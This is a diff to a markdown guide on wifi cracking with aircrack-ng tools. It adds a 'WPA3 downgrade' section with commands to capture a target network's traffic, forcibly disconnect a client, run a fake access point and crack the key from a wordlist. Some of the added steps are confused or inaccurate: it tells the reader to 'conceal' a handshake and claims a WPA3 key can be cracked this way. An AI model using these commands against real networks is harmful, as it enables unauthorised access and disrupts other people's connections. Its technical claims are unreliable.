@@ -35,8 +35,8 @@ This will list all the network interfaces on your system. Look for the one that 
 Once you have identified your wifi interface, you can set it to monitor mode using the following commands :
 
 ```bash
-sudo airmon-ng check kill   # kill processes that can interfere
-sudo airmon-ng start <interface>  # start monitor mode
+sudo airmon-ng check kill
+sudo airmon-ng start <interface>
 ```
 
 ### Network scanning
@@ -112,6 +112,50 @@ sudo aircrack-ng -w <wordlist> <capture_file>
 ```
 
 This will attempt to crack the WPA/WPA2 key using the wordlist provided. If successful, it will display the WPA/WPA2 key in the terminal.
+
+## WPA3 downgrade
+
+### Capture packets
+
+To crack WPA3, you need to capture packets from the target network. You can do this using the following command:
+
+```bash
+sudo airodump-ng --channel <channel> --bssid <BSSID> --write <output_file> <monitor_interface>
+```
+
+### Deauthenticate a client
+
+To deauthenticate a client and force it to reconnect, you can use the following command:
+
+```bash
+sudo aireplay-ng --deauth 10 -a <BSSID> -c <STATION> <monitor_interface>
+```
+
+### Fake a WPA2 AP
+
+To fake a WPA2 AP, you can use the following command:
+
+```bash
+sudo airbase-ng -e <SSID> -c <channel> -P -C 30 -z 10 <monitor_interface>
+```
+
+This will create a fake AP with the specified SSID and channel, however, this is not a true WPA2 AP, which can be an issue in some cases.
+
+### Capture the handshake
+
+Conceal the WPA3 handshake by capturing it with airodump-ng:
+
+```bash
+sudo airodump-ng --channel <channel> --bssid <fake_BSSID> --write <output_file> <monitor_interface>
+```
+
+Once you have captured the handshake, you can crack the WPA3 key using a wordlist. You can use the following command to crack the key:
+
+```bash
+sudo aircrack-ng -w <wordlist> <capture_file>
+```
+
+This will attempt to crack the WPA3 key using the wordlist provided. If successful, it will display the WPA3 key in the terminal.
 
 ## Resetting the interface
 
